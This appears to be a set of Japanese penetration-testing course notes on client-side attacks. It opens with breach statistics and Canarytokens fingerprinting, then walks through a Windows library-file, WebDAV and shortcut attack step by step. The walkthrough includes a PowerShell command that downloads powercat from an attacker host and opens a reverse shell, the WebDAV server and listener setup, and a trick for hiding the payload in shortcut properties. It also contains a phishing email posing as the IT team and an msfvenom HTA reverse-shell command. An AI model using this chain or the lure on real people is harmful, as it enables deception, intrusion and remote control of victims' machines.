- 関連ノート
	- [Phishing](Phishing.md)

---

# 現実世界の攻撃の傾向

内部NWへのイニシャルアクセスへのアタックベクターの上位ランキングは以下の通り：
- １位：Credential attack（認証情報の盗難）
- ２位：<u>Phishing</u>

→人的な脆弱性が侵害の原因の**82%** を占める。

また、外部との境界に設置しているWebサーバ（またはそのアプリ）等の<u>技術的な脆弱性を使用した侵入の割合は非常に低い。</u>

ソース:
🔗[2022-data-breach-investigations-report-dbir.pdf - Verizon（米大手通信会社）](https://www.verizon.com/business/resources/reports/2022/dbir/2022-data-breach-investigations-report-dbir.pdf)

よって、**攻撃者にとって、Client-side Attacksの重要性が高まっている**。

---

# Client-side Attacksとは

- 悪意あるファイルをターゲットに直接配信し、ターゲットの環境でファイルを実行させる攻撃のこと
- 具体的な配信方法としては以下が挙げられる：
	- Phishing
	- USB Dropping
	- 水飲み場攻撃

- 具体的な悪意あるファイルとしては以下が挙げられる：
	- Office マクロ
	- Jscriptコード
	- .lnkショートカットファイル

- 攻撃を成功させるためには、ターゲットのOSとインストールされているアプリケーションを特定する必要がある

---

# Client Fingerprinting（識別）

## Clinet Fingerprintingとは

- 直接到達できない内部NWにいるターゲットの使用OS・ブラウザを明らかにすること
- 目的は侵害前のターゲットの偵察
- 侵害時にターゲットがMacなのに、WindowsのEXEファイルを送っても無意味

## Canarytokens

- Canarytokensとは、ターゲットがブラウザで開くと、ブラウザ、IPアドレス、OSの情報が入手できるリンク（トークン含む）を生成できる
	- →生成したリンクをクリックすると空白のページが表示される

1. 🔗[Create a Canarytoken.](https://canarytokens.org/nest/generate)にアクセスする
2. 任意の種類のトークンを選択する（ここでは例としてWeb bugを選択）
	- 以下キャプチャ以外にも、下にスクロールすると、WordやExcel、PDFなども選択できる

![](../../画像ファイル/Pasted%20image%2020250513065718.png)

3. メールアドレス、コメントを入力し、任意で通知先のWebサイトも入力した上でCreate Canarytokenをクリック

![](../../画像ファイル/Pasted%20image%2020250513065904.png)

4. トークンURLが生成されたことを確認
	- How to use ：概要レベルの使い方が記載
	- Manage Canarytoken：トークンのトリガー有無、Emailアラート通知のon / offが切り替えられる

![](../../画像ファイル/Pasted%20image%2020250513070140.png)

5. Manage Canarytokenをクリック後、画面右上のALERTS HISTORYをクリック

![](../../画像ファイル/Pasted%20image%2020250513070243.png)

6. Alert Historyには、トークンをクリックしたユーザーのシステム情報が表示される。

↓誰もクリックしていない場合

![](../../画像ファイル/Pasted%20image%2020250513070649.png)

↓クリックされた後（自分でクリックした）：CSVやJSONでダウンロード可能

![](../../画像ファイル/Pasted%20image%2020250513071026.png)

7. Alerts listに記載のエントリをクリックすると、User-Agent、位置情報など、より詳細な情報を閲覧できる
	- User-Agentから、ターゲットのOS・ブラウザを推測できる
	- CanarytokenはWebページに埋め込まれたJavaScriptの🔗[Fingerprintingのコード](https://github.com/fingerprintjs/fingerprintjs)でUser-Agentを調査しているので、信頼性は高い（単純にHTTPヘッダから入手しているのではない）
	- 🔗[User-Agent parser](https://explore.whatismybrowser.com/useragents/parse/)

>[!Warning]
> - User-Agentの値は、プロキシなどによって書き換えられている場合があるので、Canarytokenの結果を完全には信頼しないこと
> - ターゲットがAd-blockerのブラウザを使っているかそうでないかで、結果が異なることがある

---
---


---
---

# Windows Library Filesの悪用

## 前提知識

### Windows Library Files

- ライブラリ機能として使用されるXML形式のファイル
- ファイルだが、中身はリンク集のような仮想フォルダ
- ダブルクリックで実行可能
- リンクはローカル or リモートどちらでも可で、ローカルディレクトリであるかのように、リモートのコンテンツを表示可能
- 💥外部の共有(WevDav共有)にアクセスさせる目的で使用
- 💥メールセキュリティにより検知されにくいので、これをターゲットに配信する
- ファイル形式：`.library-ms`

### WebDav

- HTTPを使ってWebサーバー上のファイルを読み取り・書き込みできるプロトコル
- リモートにあるファイルを、あたかもローカルで開いているように見せかけられる
- 💥WebDAV共有にペイロードの実行パスをプロパティに持つショートカットを配置する

### ショートカットファイル

- 他のファイル、フォルダ、アプリケーションなどへのポインタとして機能する特殊なファイルのこと
- 💥ダブルクリックで展開もしくは実行可能
- 💥ペイロード実行を目的で使用
- 直接メールで配信すると遮断されやすいので、Windows Library Filesを使用する
- ファイル形式：`.lnk`
- 補足：バックドアとして使われることもある
	- [3. Windows Local Persistence](../TryHackME/Red%20Teaming/3.%20Post%20Compromise/3.%20Windows%20Local%20Persistence.md#ショートカットファイル（lnk）のバックドア化)

---

## 攻撃の概要

### 段階

第一段階：攻撃者のWebDAV共有に接続するWindowsライブラリファイルを作成し、ターゲットに`.library-ms`ファイルを渡して、ターゲットに攻撃者のWebDAVディレクトリを開かせる。

第二段階：PowerShellリバースシェルを実行するための`.lnk`ショートカットファイルの形でWebDAVに格納していたものをターゲットに開かせる

### 手順概要

1. WebDAVサーバーを用意する
    - 攻撃者が用意する。
    - ここに「悪意あるショートカットファイル（.lnk）」を置く。

2. .library-msファイルを作る
    - WebDAV共有先を指す`.library-ms`ファイルを作成。
    - `.library-ms` は普通にダブルクリックできる。

3. ターゲットに`.library-ms`ファイルを渡す
    - メール添付などで送り、保存させる
    - これ自体は怪しいファイル形式に見えにくいので、**スパムフィルタを通り抜けやすい**。

4. ターゲットがダブルクリックする
    - Explorer上では「ローカルのフォルダを開いた」みたいに見える。
    - 実際には攻撃者のWebDAVサーバーにつながってる。

5. WebDAV上の.lnkファイルをダブルクリックさせる
    - ショートカットファイルの中身でリバースシェルが発動。
    - ターゲットのPCから攻撃者へコネクションが張られる。

---

## .library-ms ＋ WebDAV ＋ .lnk によるReverse Shell実行手順

### 第1段階：WebDAV サーバの準備

0. wsgidavインストール（必要に応じて）
```zsh
sudo apt install python3-wsgidav
```

1. WebDAV サーバ用ディレクトリの作成
```zsh
sudo mkdir ~/Webdav
```

2. （スキップ可）WebDavサーバ用ディレクトリにテスト用として任意のファイルを保存
```zsh
echo test > test.txt
```

3. WebDAVサーバを構築
```zsh
wsgidav --host=0.0.0.0 --port=80 --root=~/Webdav --auth=anonymous
```
- `--host=0.0.0.0`：すべてのインターフェースでWevDavを提供する
- `--root`：WevDavのホームディレクトリを指定する
- `--auth=anonymous`：認証を無効とする

![](../../画像ファイル/Pasted%20image%2020250518142233.png)

$$WebDavサーバ構築成功時の出力$$

### 第2段階：ライブラリファイル(.library-ms)の作成

3. Windowsマシン（VMを開くか、RDPで接続）で、VSCode、なければメモ帳を開く
	- ※Windowsマシン上で構築することで、ライブラリファイルや.ショートカットファイルの構築・テストが非常に楽になる

4. File > New Text File(※)で作成し、デスクトップ上にファイルを保存（ここではファイル名を`config.library-ms`とする）
	- ※：ファイル形式はPlain textでOK

![](../../画像ファイル/Pasted%20image%2020250518144800.png)

$$空白Windowsライブラリファイル$$

5. `config.library-ms`ファイルにXMLで記述し、保存
	- ：[Module 12：Client-side Attacks](#補足：XMLコードの解説)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1002</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://<AttackerIP></url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

6. 攻撃者マシンに`config.library-ms`を転送する（webdavディレクトリではないところに格納）
7. （スキップ可）WebDav共有への接続の成功を確認するため、`config.library-ms`ファイルをダブルクリックで実行する
	- ステップ2でWebdavディレクトリに作成した`test.txt`が表示されていたら成功
	- 💥ファイルパスにはリモートで開かれていることは明示されない
　　
![](../../画像ファイル/Pasted%20image%2020250518171045.png)

$$ライブラリファイルをダブルクリックした画面$$

#### 🚨注意：実行後はコードが変わるので要編集

- 一度実行すると、`serialized`というタグが新しく記入される上、`<url>`タグの値に`DavWWWRoot`が付与されてしまう
- このままだと、他のマシンや再起動後の実行で攻撃が失敗する可能性がある
- *対策*としては、ライブラリファイルを実行したら、都度、上記のxmlを再度貼り付けるしかない
	- （しかしターゲットに一度でも実行させればいいので大きな問題ではない）

![](../../画像ファイル/Pasted%20image%2020250518171758.png)

$$実行後のライブラリファイルの中身が変わっている$$


### 第3段階：.lnkファイルの準備

目的：ターゲットが実行できるリバースシェルペイロードを.lnkショートカットファイルに作成すること

7. Windowsデスクトップ上で右クリック > 新規作成 > ショートカットの作成
8. 以下のコマンドを入力し、保存
	（ファイル名はPretextに沿ったものがいい。automatic_configurationなど）
```powershell
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://[AttackerIP]:[Port]/powercat.ps1');powercat -c [AttackerIP] -p [ListenerPort] -e powershell"
```


![](../../画像ファイル/Pasted%20image%2020250519074203.png)


$$ショートカット作成中の画面$$

#### 💡Tips：ショートカットファイルを無害に見せる方法

- ターゲットがショートカットのプロパティを閲覧し、ショートカットのリンク先を確認してエクスプロイトコードに気付くことがある
- 対策として、エクスプロイトコードのうしろに無害なコマンドを追加して、本来のエクスプロイトコードを見えない位置に追いやることができる
	- Windows 10までは、Targetに256文字まで表示で、内部では4096文字まで保持できた
- ↓イメージ

![ 350](../../画像ファイル/Pasted%20image%2020250519075106.png)

### 第4段階：リバースシェルの受信

9. リバースシェルリスナーを起動しておく
```zsh
sudo rlwrap nc -lvnp <ListnerPort>
```

10. PowerCatをwebdavディレックトリ**以外**にコピーし、Python webサーバを起動しておく
```zsh
locate powercat.ps1
cp </path/to/powercat.ps1> .
sudo python -m http.server <Port>
```
- (※WebDav共有用にポート80は使用済なので80以外を指定)
- (WebDav共有にPowerCatをホストしない理由は、WebDav共有が書き込み可能であり、AVやセキュリティ製品に監視され、ペイロードを削除されるおそれがあるから)

11. テストのため、ショートカットファイルをダブルクリックし、正常にリバースシェルを受信できるか確認する

### 第5段階：配布と実行

12. Windowsマシン上で作成したショートカット(.lnk)を、攻撃者マシンの`webdav`ディレクトリに配置する

13. （スキップ可）kali上で`test.txt`があれば削除し、ライブラリファイルが変更されていたら再度クリーンにする：[Module 12：Client-side Attacks](#🚨注意：実行後はコードが変わるので要編集)

14. Pretext（口実）を用いて、メールなどで「ライブラリファイル」(.library-ms)を送付
    メッセージ例：
```
件名：設定ファイルの実行のお願い（ITチームより）

お疲れさまです。ITチームに新しく加わりましたｘｘｘと申します。

先週展開した一部の設定について、今週中を目途として最終的な設定を行っております。  
つきましては、下記の手順で設定の実行をお願いできますでしょうか。

　1. 添付ファイルをダウンロード
　2. ダウンロードフォルダから添付ファイルを開く
　3. 中にある「automatic_configuration」をダブルクリック  

これで設定は完了となります。

ご不明点やエラー等ございましたら、どうぞお気軽にご連絡ください。  
お手数をおかけしますが、よろしくお願いいたします。
```

- あとはターゲットがライブラリファイル(config-library.ms)を展開すると、内部に格納されているショートカット（automatic_configuration.lnk)が確認できるので、実行されたらリバースシェル獲得！

#### 補足：.lnkへMotWが付与されてしまう

- ライブラリファイル上でショートカット(.lnk)を実行すると、MotWが付与され、攻撃が阻害される可能性がある

![](../../画像ファイル/Pasted%20image%2020250520075229.png)

$$.lnk実行時の警告ポップアップ$$

---
---

# 補足事項

## XMLコードの解説

1. XMLの名前空間を明示する
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
...
</libraryDescription>
```
- xmlns（xml name space)：XMLにおける名前空間（[📕](../../../BSCP/Misc/📕.md#名前空間)）
- `http://schemas.microsoft.com/windows/2009/librarye`：Microsoftのライブラリスキーマに属することを明示する
- [用語](../用語.md#xmlnsにおけるリンク)

2. 「ドキュメント」のローカライズリソース（文字列・UI要素）などを参照する
```xml
<name>@windows.storage.dll,-34582</name>
<version>6</version>
```
- `<name>`：DLLライブラリの名前を指定
	- 他にも`shell32.dll`が使えるが、"shell"というワードがセキュリティ製品に検知されるかもしれないので使用を避ける
- `-34582`：ドキュメントのリソースID（ピクチャは`-34595`)
	- ※リソースIDは[Resource Hacker](https://forest.watch.impress.co.jp/article/2001/01/29/okiniiri.html)などのツールを使う方法があるが、生成AIに聞く方が楽
- [Module 12：Client-side Attacks](#補足：リソースID(`@windows.storage.dll,-34582`)について)
- `<version>`：任意の数値
- [用語](../用語.md#DLL(Dynamic%20link%20library))

3. ライブラリファイルの見た目を整備する
```xml
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1002</iconReference>
```
- `<isLibraryPinned>`：Windowsエクスプローラーのナビゲーターパネルに表示されるようにする（以下画像赤枠部分）
- `<iconReference>`：ライブラリファイルのアイコンをリソースのみDLLから選択する
	- `imageres.dll`：リソースが格納されたシステム用DLL
		- パス：C:\Windows\System32\imageres.dll
	- 1002：ドキュメントのアイコンを指すリソースID（1003：ピクチャのアイコン）

 ![](../../画像ファイル/Pasted%20image%2020250518151605.png)

4. ライブラリファイルがWindowsエクスプローラー上で開かれたときにどのようなカラム構成（以下画像赤枠）になるかを指定する
```xml
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
```
- [Microsoft documentation](https://learn.microsoft.com/ja-jp/windows/win32/shell/schema-library-foldertype)の「フォルダーの種類」に記載されているGUIDを`<folderType>`に指定する（今回はアイコンをドキュメントにしているのでドキュメントのGUIDを指定）
	- 例えばフォルダタイプがミュージックだと、アーティスト名やトラック番号のカラムとなってしまう

![](../../画像ファイル/Pasted%20image%2020250518152940.png)

5. ライブラリファイルが指すストレージの場所を指定する
```xml
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://[AttackerIP]</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
```
- `<isDefaultSaveLocation>`：ユーザーがファイルを保存したときのwindowsエクスプローラーの挙動・保存場所を指定（true＝デフォルト）
- `<isSupported>`：互換性のために存在するが不要なのでfalse
- `<simpleLocation>`：リモートの場所を指定（WebDav共有）

## リソースID(`@windows.storage.dll,-34582`)について

- `@windows.storage.dll,-34582` は、`windows.storage.dll` の中にあるリソースID 34582 を参照する

- Windowsエクスプローラーでライブラリ（たとえば「ドキュメント」や「ピクチャ」など）を表示するとき、見た目の名称が必要になる
- その表示名をハードコードされた文字列ではなく、DLLの中にあるローカライズ済み（多言語対応された）リソースから取得する形式がこの記述

- 何のためにあるのか？　→　 ライブラリの名前（表示名）を指定するためにある
- 34582じゃなくて適当な値でもいいのか？　→　ダメ
- なぜローカライズDLLを使うのか？↓

| 方法                                                      | 影響                                                           |
| ------------------------------------------------------- | ------------------------------------------------------------ |
| `<name>Documents</name>` のように直接書く                       | ・OSの言語が英語以外（日本語など）の場合に対応できない  <br>・翻訳作業が必要になる  <br>・一貫性がなくなる |
| `<name>@windows.storage.dll,-34582</name>` のようにDLLを参照する | ✅ OSが自動で言語に合わせて表示  <br>✅ Windows標準ライブラリと同じ形式で自然に見える          |

## HTAペイロード

- マクロの代わりに使えるペイロード

msfvenom
```zsh
msfvenom -p windows/shell_reverse_tcp -f hta-psh -o shell.hta LPORT=443 LHOST=<attacker_IP>
```

コードスニペット
```html
<html>
<head>
<script language="VBScript">

  <!-- just opens cmd terminal -->
  var c= 'cmd.exe'
  new ActiveXObject('WScript.Shell').Run(c);

</script>
</head>
<body>
<script language="VBScript">
<!-- close this HTA window now that script running -->
self.close();
</script>
</body>
</html>
```
